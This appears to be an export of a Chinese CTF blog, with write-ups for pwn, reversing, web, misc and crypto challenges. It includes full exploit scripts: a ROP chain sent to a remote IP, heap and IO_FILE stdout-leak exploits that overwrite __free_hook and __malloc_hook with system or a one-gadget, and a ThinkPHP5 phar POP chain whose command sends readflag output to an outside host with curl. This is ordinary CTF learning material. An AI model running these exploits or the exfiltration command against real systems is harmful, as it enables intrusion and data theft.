    <content type="text"><![CDATA[pwnthree静态编译文件，开了NX， 有一个3字节的shellcode可以操作； 在Tell me的时候写入ropchain，再执行shellcode跳转到0x80f6cc0执行ropchain exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env python2# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = &apos;&apos;p += pack(&apos;&lt;I&apos;, 0x08072f8b) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080f5000) # @ .datap += pack(&apos;&lt;I&apos;, 0x080c11e6) # pop eax ; retp += &apos;/bin&apos;p += pack(&apos;&lt;I&apos;, 0x080573e5) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x08072f8b) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080f5004) # @ .data + 4p += pack(&apos;&lt;I&apos;, 0x080c11e6) # pop eax ; retp += &apos;//sh&apos;p += pack(&apos;&lt;I&apos;, 0x080573e5) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x08072f8b) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080f5008) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080569a0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x080573e5) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080481d9) # pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080f5000) # @ .datap += pack(&apos;&lt;I&apos;, 0x08072fb2) # pop ecx ; pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080f5008) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080f5000) # padding without overwrite ebxp += pack(&apos;&lt;I&apos;, 0x08072f8b) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080f5008) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080569a0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0808041a) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x08049903) # int 0x80from pwn import *context.log_level = &apos;debug&apos;# io = process(&apos;./pwn&apos;)io = remote(&quot;47.104.190.38&quot;,&quot;12001&quot;)sd = lambda s:io.send(s)sl = lambda s:io.sendline(s)rc = lambda s:io.recv(s)ru = lambda s:io.recvuntil(s)sda = lambda a,s:io.sendafter(a,s)sla = lambda a,s:io.sendlineafter(a,s)ru(&quot;index:\n&quot;)sl(&apos;0&apos;)ru(&quot;much!\n&quot;)sl(&quot;\x89\xcc\xc3&quot;)ru(&quot;size:\n&quot;)sl(str(0x200))ru(&quot;me:\n&quot;)# gdb.attach(io,&quot;b *0x8048C50&quot;)sl(p)io.interactive() rexx分三步加密，先xxtea，再换顺序，最后迭代亦或后去check，因为数据不多所以最后一步亦或手撕了出来，换回顺序写个xxtea的解密 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding=utf8import structmessage = &apos;\xbc\xa5\xce\x40\xf4\xb2\xb2\xe7\xa9\x12\x9d\x12\xae\x10\xc8\x5b\x3d\xd7\x06\x1d\xdc\x70\xf8\xdc&apos;key = &quot;flag\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; data = 0x9E3779B9 def _long2str(v, w): n = (len(v) - 1) &lt;&lt; 2 if w: m = v[-1] if (m &lt; n - 3) or (m &gt; n): return &apos;&apos; n = m s = struct.pack(&apos;&lt;%iL&apos; % len(v), *v) return s[0:n] if w else s def _str2long(s, w): n = len(s) m = (4 - (n &amp; 3) &amp; 3) + n s = s.ljust(m, &quot;\x00&quot;) v = list(struct.unpack(&apos;&lt;%iL&apos; % (m &gt;&gt; 2), s)) if w: v.append(n) return v def decrypt(str, key): if str == &apos;&apos;: return str v = _str2long(str, False) k = _str2long(key.ljust(16, &quot;\x00&quot;), False) n = len(v) - 1 z = v[n] y = v[0] q = 6 + 52 // (n + 1) sum = (q * data) &amp; 0xffffffff while (sum != 0): e = sum &gt;&gt; 2 &amp; 3 for p in xrange(n, 0, -1): z = v[p - 1] v[p] = (v[p] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[p] z = v[n] v[0] = (v[0] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[0 &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[0] sum = (sum - data) &amp; 0xffffffff return _long2str(v, True) if __name__ == &quot;__main__&quot;: flag = decrypt(message,key) print flag easyRE通过字符定位到主逻辑，两次解密可以得到 Info:The first four chars are flag 和 https://bbs.pediy.com/thread-254172.htm，这是个关于主动防御的看雪文章，然而并没有发现flag，emmmm主动防御，其实是在误导我们；真正的flag在sub_400D35位置，结合info得到key后，简单的亦或解密出来即可 123456data = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45,0x5B]key = [38,89,65,49]flag = &quot;&quot;for j in range(len(data)): flag += chr(data[j] ^ key[j % 4])print flag childREUnDecorateSymbolName 是c++的去函数修饰的函数，写个脚本自己测试可以得到31函数名为?My_Aut0_PWN@ROPxx@@AAEPADPAE@Z， 但是前面还有一个调换了顺序，改回来后可以得到正确的输入Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP，md5一下 flag:flag{63b148e750fed3a33419168ac58083f5} cacl认真分析可以发现程序实现了自己的一套大整数运算，有加、减、乘、除和次方；最后结果为0即能得到flag 前面一堆计算都没用，后面程序计算了下面两个数： a = (x1+x2)^3 - 3x1x2^2 - 3x2x1^2 b = (x3 + 4)^3 - 12x3^2 - 48x3-22 化简一下得到：a = x1^3 + x2^3 , b = x3^3 + 42 最后程序判断结果： a == b，https://xw.qq.com/cmsid/20190906A0NZO5 得到flag: 951e27be2b2f10b7fa22a6dc8f4682bd webticket_system利用postXML去读源文件 把源文件和readflag文件读下来以后可以分析出，攻击过程是上传一个可执行的php，通过thinkphp5的pop链和phar去触发反序列化漏洞 readflag文件和*ctf的一模一样，直接拿当初的脚本就行了 1234567891011121314151617181920212223242526272829303132333435&lt;?php$descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;file&quot;, &quot;/tmp/error-output.txt&quot;, &quot;a&quot;));$process = proc_open(&apos;/readflag&apos;, $descriptorspec, $pipes, $cwd, $env);if (is_resource($process)) &#123; $question = fread($pipes[1],1024); $question = fread($pipes[1],1024); $question = trim($question); echo $question; eval(&apos;$result = &apos;.$question.&apos;;&apos;); fwrite($pipes[0], $result); fclose($pipes[0]); $flag = fread($pipes[1],1024); $flag = fread($pipes[1],1024); $flag = fread($pipes[1],1024); echo $flag; fclose($pipes[1]); $return_value = proc_close($process); echo $return_value;&#125;?&gt; 上传过去以后拿微笑师傅的pop链打过去，本地监听就行123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpnamespace think\process\pipes &#123; class Windows &#123; private $files; public function __construct($files) &#123; $this-&gt;files = array($files); &#125; &#125;&#125;namespace think\model\concern &#123; trait Conversion &#123; protected $append = array(&quot;Smi1e&quot; =&gt; &quot;1&quot;); &#125; trait Attribute &#123; private $data; private $withAttr = array(&quot;Smi1e&quot; =&gt; &quot;system&quot;); public function get($system) &#123; $this-&gt;data = array(&quot;Smi1e&quot; =&gt; &quot;$system&quot;); &#125; &#125;&#125;namespace think &#123; abstract class Model &#123; use model\concern\Attribute; use model\concern\Conversion; &#125;&#125;namespace think\model&#123; use think\Model; class Pivot extends Model &#123; public function __construct($system) &#123; $this-&gt;get($system); &#125; &#125;&#125;namespace &#123; $Conver = new think\model\Pivot(&quot;curl http://134.175.34.73:2334/ -d `php /tmp/uploads/0cc175b9c0f1b6a831c399e269772661/20191111/6582f47189690b9acfc01cc069af8ea8.xml|tac|tr -d \&quot;\\n\&quot;|sed &apos;s/ //g&apos;`;&quot;); $payload = new think\process\pipes\Windows($Conver); @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($payload); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); echo urlencode(serialize($payload));&#125; misc签到填个问卷就能拿到flag了 Advertising for Marriage看内存看到有张vegetable.png 这个图片高度是错误的，在linux里面打不开，通过CRC码爆破出高度是D3 然后再看进程，有个画图进程，把它dump下来 dump下来用gimp打开看到是 这里建议把图片镜像一下 再结合前面的hint 然后就能lsb恢复出加密的数据 base64解密以后提示维吉尼亚，gnxtmwg7r1417psedbs62587h0，密钥：bcxneedmoneyandgirlfirend 解密就能得到flag d7f1417bfafbf62587e0 恶臭的数据包拿到数据包发现全是wifi加密的流量，马上想到 aircrack-ng cacosmia.cap 发现数据包网路名称是mamawoxiangwantiequan 然后想到爆破八位的wifi密码提取原包，本来生成了个700多m的字典去爆，发现要10h就直接顺手先试试弱密码12345678，解出源包cacosmia-dec.cap 然后提取http协议传输的文件，binwalk最大那个发现一张图和一个加密压缩包， 找到传压缩包的tcp流，发现cookie中JWT有hint，压缩包密码是ping的网址： 过滤dns协议网址，一个个试，找到最后一个就是密码 解压出flag，flag{f14376d0-793e-4e20-9eab-af23f3fdc158} cryptoboardcast出题人失误，源文件直接放了flag]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.26星盟awd之magic_heap]]></title>
    <url>%2F2020%2F06%2F21%2F10.26%E6%98%9F%E7%9B%9Fawd%2F</url>
    <content type="text"><![CDATA[程序保护全开，程序功能： 12341.add2.delete3.edit4.exit 但是有一个隐藏功能：666可打印出基地址 123456if ( v5 == 666 )&#123; v3 = (int *)&amp;gra123; v4 = "%p\n"; printf("%p\n", &amp;gra123);&#125; 1、add函数 中规中矩没有漏洞，但是限制大小0x90~0x2333也就是没有fastbin 2、delete函数 正常free，没有UAF，没有下标越界等情况 3、edit函数 神奇的是这个edit函数，啥都不干，就给你个任意地址写 123456789puts("Name:");read(0, &amp;buf, 0x28uLL);bssname = buf;qword_2020E8 = v2;qword_2020F0 = v3;qword_2020F8 = v4;lclp = (__int64)v5;*v5 = 0xCAFEBABELL; //任意地址写入0xCAFEBABEputs("OK"); 所以整个程序，在知道基地址的情况下，有个任意地址写漏洞，虽然写入的内容不可控，但是还是很有用的 首先先泄漏libc地址 12345678910111213141516add(0x98,'a')#0add(0x98,'b')#1add(0x98,'c')#2add(0xb8,'d')#3add(0x98,'/bin/sh\x00')#4delete(0)add(0x98,'a')#0ru("Content is:\n")main_arena = u64(rc(6).ljust(8,'\x00')) - 65libc_base = main_arena - 0x3c4b20system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']global_max_fast = libc_base + 0x3c67f8log.warn("main_arena --&gt; %s",hex(main_arena))log.warn("libc_base --&gt; %s",hex(libc_base)) 在得到libc和基地址的基础上，因为add的大小被限制了，但是可以任意地址写，所以这里把global_max_fast直接写成0xCAFEBABELL 接下来，只需要构造fastbin attack申请出free_hook修改成system即可，具体如下： 1、同样利用任意地址写修改free_hook - 0x8为0xca作为size 2、利用任意地址写攻击gra123位置（即存放堆的全局变量），构造overlap 3、将free_hook链上去申请出来 （这里overlap具体还要自己去理解）大概就是将一个大的把一个小的包住，然后两个都free掉，再申请这个大的时候就能够修改小的堆的fd exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)rl = lambda :p.recvline()sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,message): sla("4.exit\n",'1') sla("Length:\n",str(size)) sda("Content:\n",message)def delete(id): sla("4.exit\n",'2') sla("Id:\n",str(id))def edit(message): sla("4.exit\n",'3') sla("Name:\n",message)sla("4.exit\n",'666')message_addr = int(rl(),16)log.warn("message_addr --&gt; %s",hex(message_addr))add(0x98,'a')#0add(0x98,'b')#1add(0x98,'c')#2add(0xb8,'d')#3add(0x98,'/bin/sh\x00')#4delete(0)add(0x98,'a')#0ru("Content is:\n")main_arena = u64(rc(6).ljust(8,'\x00')) - 65libc_base = main_arena - 0x3c4b20system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']global_max_fast = libc_base + 0x3c67f8log.warn("main_arena --&gt; %s",hex(main_arena))log.warn("libc_base --&gt; %s",hex(libc_base))edit(0x20*'a' + p64(global_max_fast))edit(0x20*'a' + p64(free_hook - 0x8-3))delete(1)add(0x98,0x40*'a' + p64(0) + p64(0x251))edit(0x20*'a' + p64(message_addr + 9))delete(2)delete(3)add(0x248,0xe0*'a' + p64(0) + p64(0xc1) + p64(free_hook-0x10)*2)add(0xb8,'b')add(0xb8,p64(system))delete(4)# debug()p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE泄露libc]]></title>
    <url>%2F2019%2F09%2F21%2FIO_FILE%2F</url>
    <content type="text"><![CDATA[最近经常遇到没有show函数的堆了，吃了不少没有地址的亏，在这里记录一下泄露的方法 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。 为什么flag要改成0xfbad1800，看源码： puts函数在源码中是由_IO_puts实现的，而_IO_puts函数内部会调用_IO_sputn，结果会执行_IO_new_file_xsputn，最终会执行_IO_overflow 12345678910111213141516171819202122232425262728int _IO_new_file_overflow (_IO_FILE *f, int ch) &#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123;//避免进入 f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123; ......//避免进入 ...... &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //进入目标 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\n')) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; &#125; 可以看到_IO_do_write是最后调用的函数，而_IO_write_base是我们要修改的目标。 这里f-&gt;_flag &amp; _IO_NO_WRITES的值应该为0，为了不进入第一个if分支 同时使f-&gt;_flag &amp;_IO_CURRENTLY_PUTTING的值为1，为了不进入第二个if分支 _IO_do_write函数的参数为：stdout结构体、_IO_write_base和size(由f-&gt;_IO_write_ptr - f-&gt;_IO_write_base决定)，而_IO_do_write实际会调用new_do_write，参数一样。 12345678910111213141516171819202122static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; ... _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // 调用函数输出输出缓冲区 count = _IO_SYSWRITE (fp, data, to_do); //最终输出 ... return count;&#125; 这里，_IO_SYSWRITE就是我们的目标，这相当于write(fp,data,to_do)。 _IO_SYSSEEK只是简单的调用lseek，但是我们不能完全控制fp-&gt;_IO_write_base - fp-&gt;_IO_read_end的值，如果fp-&gt;_IO_read_end的值设置为0，那么_IO_SYSSEEK的第二个参数值就会过大，如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话，那么在其它地方就会有问题，因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end。所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支。 最终需要构造的fp-flags是这样的，才能绕过上面提到的分支。 1234_flags = 0xfbad0000 _flags &amp;= ~_IO_NO_WRITES ## _flags = 0xfbad0000 _flags |= _IO_CURRENTLY_PUTTING ## _flags = 0xfbad0800_flags |= _IO_IS_APPENDING ## _flags = 0xfbad1800 所以通常将stdout的flags修改成0xfbad1800，将_IO_write_base改小，就可以造成libc的泄漏。 这里以De1CTF的weapon和数字经济云的 fkroman为例 weapon程序保护全开，got不可写 12341. create you weapon2. delete you weapon3. rename your weaponchoice &gt;&gt; 三个功能，没有show函数 1234567891011121314151617unsigned __int64 delete()&#123; signed int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("input idx :"); v1 = sub_AAE(); if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 ) &#123; printf("error"); exit(0); &#125; free(*((void **)&amp;unk_202060 + 2 * v1)); //UAF puts("Done!"); return __readfsqword(0x28u) ^ v2;&#125; delete中存在UAF漏洞 利用思路： 利用UAF申请到stdout结构体上面，修改flags泄漏libc，将malloc_hook覆盖成onegadget 为了方便调试这里先把asrl关了sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot; 接下来说一下我具体的做法，首先申请大小为0x70的chunk0,chunk1,chunk2,将chunk0,chunk1释放掉，此时fastbin:chunk1-&gt;chunk0自用UAF使得fastbin:chunk1-&gt;chunk0内部实现overlap为下一步修改地址做准备，比如我是:0x70: 0x555555757070 —▸ 0x555555757000 ◂— 0x0 –&gt; 0x70: 0x555555757070 —▸ 0x555555757010 ◂— 0x0再将0x555555757010申请为chunk4，现在rename chunk4就可以修改chunk1的大小了。free chunk1，修改chunk1大小为0x90再次free chunk1，这个时候fastbin中的chunk1的fd和bk就会被写入一个main_arena+88 1234567891011pwndbg&gt; bins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x555555757070 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757070 /* &apos;ppuUUU&apos; */0x80: 0x0unsortedbinall: 0x555555757070 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757070 /* &apos;ppuUUU&apos; */ 在stdout往上找到一个0x7f的位置充当size，将main_arena+88低2字节覆盖成25dd（5dd是固定的，但是2是随机的，1/16） 申请出来，修改flags和_IO_write_base低字节 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p _IO_2_1_stdout_$2 = &#123; file = &#123; _flags = -72542208, //0xfbad1800 _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; 'A' &lt;repeats 32 times&gt;, //低字节修改成了00 _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "\n", _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125; 得到libc后，就UAF将onegadget写入malloc_hook 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def msg(msg,addr): log.warn(msg + "--&gt; " + hex(addr))def create(id,size,data,flag=0): if flag: sl('1') else: ru("choice &gt;&gt; \n") sl('1') ru("weapon: ") sl(str(size)) ru("index: ") sl(str(id)) if flag: ru("name:") else: ru("name:\n") sd(data)def delete(id,flag=0): if flag: sl('2') else: ru("&gt;&gt; \n") sl('2') ru("idx :") sl(str(id))def rename(id,data,flag=0): if flag: sl('3') else: ru("&gt;&gt; \n") sl('3') ru("idx: ") sl(str(id)) if flag: ru("content:") else: ru("content:\n") sd(data)def getshell(): ru("choice &gt;&gt; ") sl('1') ru("weapon: ") sl('32') ru("index: ") sl('0') p.interactive()def pwn(): create(0,0x60,p64(0) + p64(0x71)) create(1,0x60,p64(0) + p64(0x51)) create(2,0x60,p64(0)*3 + p64(0x51)) delete(0) delete(1) rename(1,'\x10') create(3,0x60,'a') # delete(1) create(4,0x60,p64(0)*0xb + p64(0x71)) delete(1) rename(4,p64(0)*0xb + p64(0x91)) delete(1) rename(4,p64(0)*0xb + p64(0x71))#0x35dd rename(1,'\xdd\x25') create(5,0x60,'a') # debug(0xc9b) create(6,0x60,'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00') # debug() one = [0x45216,0x4526a,0xf02a4,0xf1147] IO_stderr = u64(ru("\x7f")[-6:].ljust(8,'\x00'))-192 libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_'] onegadget = one[3] + libc_base malloc_hook = libc_base + libc.symbols['__malloc_hook'] fack_chunk = malloc_hook - 0x23 ''' msg("IO_stderr",IO_stderr) msg("libc_base",libc_base) msg("malloc_hook",malloc_hook) msg("fack_chunk",fack_chunk) msg("onegadget",onegadget) ''' create(7,0x60,'a',1) delete(7,1) rename(7,p64(fack_chunk),1) create(7,0x60,'a',1) create(8,0x60,'b'*0x13 + p64(onegadget),1) getshell() # debug()i = 0while 1: i += 1 log.warn(str(i)) try: pwn() except Exception: p.close() p = process('./pwn') continue# pwn() fkroman程序同样保护全开，没有show功能 漏洞：UAF，任意长度堆溢出 利用思路一样，先攻击stdout泄漏libc，再将onegadget写入malloc_hook 只不过这题更简单，堆溢出直接改size不用overlap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./fkroman') elf = ELF('./fkroman') libc = elf.libcelse: p = remote("121.40.246.48","9999") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x4060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def alloc(id,size): ru("choice: ") sl('1') ru("Index: ") sl(str(id)) ru("Size: ") sl(str(size))def free(id): ru("choice: ") sl('3') ru("Index: ") sl(str(id))def edit(id,size,data): ru("choice: ") sl('4') ru("Index: ") sl(str(id)) ru("Size: ") sl(str(size)) ru("Content: ") sd(data)def getshell(): ru("choice: ") sl('1') ru("Index: ") sl('0') ru("Size: ") sl('32') p.interactive()def msg(msg,addr): log.warn(msg + "--&gt;" + hex(addr))def pwn(): alloc(0,0x20) alloc(1,0x60) alloc(2,0x60) pay = p64(0)*3 + p64(0x51) edit(2,len(pay),pay) free(1) edit(0,0x30,p64(0)*5 + p64(0x91)) free(1) edit(1,2,'\xdd\x25') edit(0,0x30,p64(0)*5 + p64(0x71)) alloc(0,0x60) alloc(1,0x60) pay = 0x33*'A' + p64(0xfbad1800) + p64(0)*3 + '\x00' edit(1,len(pay),pay) one = [0x45216,0x4526a,0xf02a4,0xf1147] stderr = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 192 libc_base = stderr - libc.symbols['_IO_2_1_stderr_'] malloc_hook = libc_base + libc.symbols['__malloc_hook'] fack_chunk = malloc_hook - 0x23 onegadget = one[3] + libc_base ''' msg("stderr",stderr) msg("libc_base",libc_base) msg("malloc_hook",malloc_hook) msg("fack_chunk",fack_chunk) msg("onegadget",onegadget) ''' alloc(0,0x60) free(0) edit(0,8,p64(fack_chunk)) alloc(0,0x60) alloc(1,0x60) pay = 0x13*'A' + p64(onegadget) edit(1,len(pay),pay) getshell() # debug()i = 0while 1: i += 1 log.warn(str(i)) try: pwn() except Exception: p.close() p = process('./fkroman')]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw系列]]></title>
    <url>%2F2019%2F07%2F03%2Fpwnable.tw%2F</url>
    <content type="text"><![CDATA[calc不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。 程序分析保护 开启了canary 跟NX 主函数calc get_expr用来存放计算公式的，init_pool是一个初始化函数，将v1数组初始化为0，bzero(&amp;s,0x400) == memset(s,0,0x400)，parse_expr函数便是这个程序的关键，用来计算结果的。 分析parse_expr函数该函数主要分为两个步骤：解析运算表达式、计算运算结果 。 该函数两个参数，参数1为用户输入的运算表达式的地址，参数2为init_pool函数初始化的v1数组（下文命名为initpool） 函数分配了100字节的空间给一个数组operator[100]，用来保存所有的操作符，其实函数的漏洞就在这个运算过程中，所以我们要先很清楚地熟悉parse_expr函数的运算过程。 首先，函数进入一个大循环，对运算表达式的每一个字符分析处理，判断条件：当前字符的ASCII码值-48如果 大于9，则将其识别为运算符；反之识别为数字处理。这时候大家可能会有两个疑问：1、ASCII码小于48的字符可不止运算符，大于48的也不止数字呀 ；2、“+，-，x，/，%”这几个运算符可都比48小，-48就是负数了，也肯定小于9啊。第一，早在get_expr函数输入运算式的时候就已经限定了输入的字符只能是数字和”+-*/%” 第二、”+-*/%”的ASCII虽然小于48，但是程序定义的差值是无符号整形(unsigned int)，所以作为一个无符号的数，小于48减去48是远远大于9的。 继续往下讲，如果当前字符为数字，那么循环中什么也不做，i++继续往下遍历，如果当前字符为运算符，函数要做的第一件事是将前面的字符转化为整数保存起来，保存在哪呢？就保存在initpool数组中 从逻辑来看操作数是从initpool[1]的位置开始保存的，那么问题来了initpool[0]用来干嘛呢，从count=(*initpool)++这一句来看initpool[0]保存的应该是当前运算数的个数，(正常下固定为2，因为一个操作符两个操作数)，由此可见，程序两个最重要的数据结构为initpool[]和operator[]，一个存操作数一个存操作符。 接下来为了保证输入的表达式是合法的，函数对当前操作符的下一个字符进行了判断若后一个字符也是操作符的话，则视当前表达式非法，退出此次运算。 